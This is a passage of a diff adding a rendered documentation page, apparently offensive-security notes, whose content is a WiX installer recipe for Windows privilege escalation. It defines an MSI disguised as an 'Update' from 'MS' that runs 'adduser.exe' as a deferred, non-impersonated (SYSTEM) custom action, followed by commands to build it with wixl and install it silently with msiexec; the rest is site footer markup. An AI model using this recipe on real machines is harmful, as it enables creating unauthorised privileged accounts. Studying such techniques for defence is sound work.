+<a id="__codelineno-77-2" name="__codelineno-77-2" href="#__codelineno-77-2"></a><span class="nt">&lt;Wix</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">"http://schemas.microsoft.com/wix/2006/wi"</span><span class="nt">&gt;</span>
+<a id="__codelineno-77-3" name="__codelineno-77-3" href="#__codelineno-77-3"></a><span class="w">  </span><span class="nt">&lt;Product</span><span class="w"> </span><span class="na">Id=</span><span class="s">"*"</span><span class="w"> </span><span class="na">Name=</span><span class="s">"Update"</span><span class="w"> </span><span class="na">Version=</span><span class="s">"1.0.0"</span><span class="w"> </span><span class="na">Manufacturer=</span><span class="s">"MS"</span><span class="w"> </span><span class="na">Language=</span><span class="s">"1033"</span><span class="nt">&gt;</span>
+<a id="__codelineno-77-4" name="__codelineno-77-4" href="#__codelineno-77-4"></a><span class="w">    </span><span class="nt">&lt;Package</span><span class="w"> </span><span class="na">InstallerVersion=</span><span class="s">"200"</span><span class="w"> </span><span class="na">Compressed=</span><span class="s">"yes"</span><span class="nt">/&gt;</span>
+<a id="__codelineno-77-5" name="__codelineno-77-5" href="#__codelineno-77-5"></a><span class="w">    </span><span class="nt">&lt;MediaTemplate</span><span class="w"> </span><span class="na">EmbedCab=</span><span class="s">"yes"</span><span class="nt">/&gt;</span>
+<a id="__codelineno-77-6" name="__codelineno-77-6" href="#__codelineno-77-6"></a><span class="w">    </span><span class="nt">&lt;Feature</span><span class="w"> </span><span class="na">Id=</span><span class="s">"Main"</span><span class="nt">&gt;&lt;ComponentGroupRef</span><span class="w"> </span><span class="na">Id=</span><span class="s">"Files"</span><span class="nt">/&gt;&lt;/Feature&gt;</span>
+<a id="__codelineno-77-7" name="__codelineno-77-7" href="#__codelineno-77-7"></a><span class="w">    </span><span class="nt">&lt;ComponentGroup</span><span class="w"> </span><span class="na">Id=</span><span class="s">"Files"</span><span class="w"> </span><span class="na">Directory=</span><span class="s">"TARGETDIR"</span><span class="nt">&gt;</span>
+<a id="__codelineno-77-8" name="__codelineno-77-8" href="#__codelineno-77-8"></a><span class="w">      </span><span class="nt">&lt;Component</span><span class="w"> </span><span class="na">Id=</span><span class="s">"MainComponent"</span><span class="w"> </span><span class="na">Guid=</span><span class="s">"12345678-1234-1234-1234-123456789012"</span><span class="nt">&gt;</span>
+<a id="__codelineno-77-9" name="__codelineno-77-9" href="#__codelineno-77-9"></a><span class="w">        </span><span class="nt">&lt;File</span><span class="w"> </span><span class="na">Id=</span><span class="s">"adduser.exe"</span><span class="w"> </span><span class="na">Source=</span><span class="s">"adduser.exe"</span><span class="nt">/&gt;</span>
+<a id="__codelineno-77-10" name="__codelineno-77-10" href="#__codelineno-77-10"></a><span class="w">      </span><span class="nt">&lt;/Component&gt;</span>
+<a id="__codelineno-77-11" name="__codelineno-77-11" href="#__codelineno-77-11"></a><span class="w">    </span><span class="nt">&lt;/ComponentGroup&gt;</span>
+<a id="__codelineno-77-12" name="__codelineno-77-12" href="#__codelineno-77-12"></a><span class="w">    </span><span class="nt">&lt;CustomAction</span><span class="w"> </span><span class="na">Id=</span><span class="s">"Run"</span><span class="w"> </span><span class="na">FileKey=</span><span class="s">"adduser.exe"</span><span class="w"> </span><span class="na">ExeCommand=</span><span class="s">""</span><span class="w"> </span><span class="na">Execute=</span><span class="s">"deferred"</span><span class="w"> </span><span class="na">Impersonate=</span><span class="s">"no"</span><span class="nt">/&gt;</span>
+<a id="__codelineno-77-13" name="__codelineno-77-13" href="#__codelineno-77-13"></a><span class="w">    </span><span class="nt">&lt;InstallExecuteSequence&gt;</span>
+<a id="__codelineno-77-14" name="__codelineno-77-14" href="#__codelineno-77-14"></a><span class="w">      </span><span class="nt">&lt;Custom</span><span class="w"> </span><span class="na">Action=</span><span class="s">"Run"</span><span class="w"> </span><span class="na">After=</span><span class="s">"InstallFiles"</span><span class="nt">/&gt;</span>
+<a id="__codelineno-77-15" name="__codelineno-77-15" href="#__codelineno-77-15"></a><span class="w">    </span><span class="nt">&lt;/InstallExecuteSequence&gt;</span>
+<a id="__codelineno-77-16" name="__codelineno-77-16" href="#__codelineno-77-16"></a><span class="w">  </span><span class="nt">&lt;/Product&gt;</span>
+<a id="__codelineno-77-17" name="__codelineno-77-17" href="#__codelineno-77-17"></a><span class="w">  </span><span class="nt">&lt;Fragment&gt;&lt;Directory</span><span class="w"> </span><span class="na">Id=</span><span class="s">"TARGETDIR"</span><span class="w"> </span><span class="na">Name=</span><span class="s">"SourceDir"</span><span class="nt">/&gt;&lt;/Fragment&gt;</span>
+<a id="__codelineno-77-18" name="__codelineno-77-18" href="#__codelineno-77-18"></a><span class="nt">&lt;/Wix&gt;</span>
+</code></pre></div></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a>wixl<span class="w"> </span>-o<span class="w"> </span>adduser.msi<span class="w"> </span>adduser.wxs
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a>msiexec /quiet /qn /i adduser.msi
+</code></pre></div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["content.code.copy", "content.action.edit", "content.action.view", "content.tooltips", "navigation.tracking", "navigation.top", "search.share", "search.suggest"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  </body>
+</html>
